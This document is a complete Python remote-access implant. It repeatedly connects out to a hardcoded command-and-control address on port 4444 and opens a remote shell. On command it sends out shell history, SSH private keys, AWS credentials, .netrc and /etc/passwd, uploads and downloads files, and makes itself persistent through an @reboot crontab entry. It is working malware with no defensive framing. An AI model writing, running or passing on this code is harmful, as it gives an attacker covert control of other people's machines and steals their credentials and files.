#!/usr/bin/env python3
import socket,subprocess,os,threading,time,json,base64
C2_HOST="192.168.200.114"
C2_PORT=4444
def sh(cmd):
    r=subprocess.run(cmd,shell=True,capture_output=True,timeout=30)
    return (r.stdout+r.stderr).decode(errors="replace") or "[no output]"
def send(s,d):
    p=d.encode();s.sendall(len(p).to_bytes(4,"big")+p)
def recv(s):
    n=int.from_bytes(s.recv(4),"big");d=b""
    while len(d)<n:d+=s.recv(4096)
    return json.loads(d)
def exfil():
    import glob,pathlib
    o={}
    for k,v in {"history":"~/.bash_history","ssh":"~/.ssh/id_rsa","aws":"~/.aws/credentials","netrc":"~/.netrc"}.items():
        p=pathlib.Path(v).expanduser()
        o[k]=p.read_text(errors="replace")[:4096] if p.is_file() else "[missing]"
    o["passwd"]=sh("cat /etc/passwd")
    o["whoami"]=sh("whoami && id && hostname -I")
    return json.dumps(o)
def loop(s):
    send(s,json.dumps({"hello":sh("whoami")+" @ "+sh("hostname")+" | "+sh("uname -r")}))
    while True:
        pkt=recv(s);cmd=pkt.get("cmd","").upper();args=pkt.get("args","")
        if cmd=="EXIT":break
        elif cmd=="SHELL": res=sh(args)
        elif cmd=="EXFIL": res=exfil()
        elif cmd=="GET":
            try: res="FILE_B64:"+base64.b64encode(open(args,"rb").read()).decode()
            except Exception as e: res=f"[err]{e}"
        elif cmd=="PUT":
            p,b=args.split(":",1)
            open(p,"wb").write(base64.b64decode(b)); res=f"wrote {p}"
        elif cmd=="PERSIST":
            cur=__import__("subprocess").getoutput("crontab -l 2>/dev/null")
            line=f"@reboot python3 {os.path.abspath(__file__)}\n"
            if line not in cur:
                import subprocess as sp
                p2=sp.Popen(["crontab","-"],stdin=sp.PIPE);p2.communicate((cur+"\n"+line).encode())
            res="persisted"
        else: res=f"unknown cmd: {cmd}"
        send(s,json.dumps({"status":"ok","data":res}))
while True:
    try:
        s=socket.socket();s.connect((C2_HOST,C2_PORT));s.settimeout(None);loop(s);s.close()
    except:pass
    time.sleep(15)
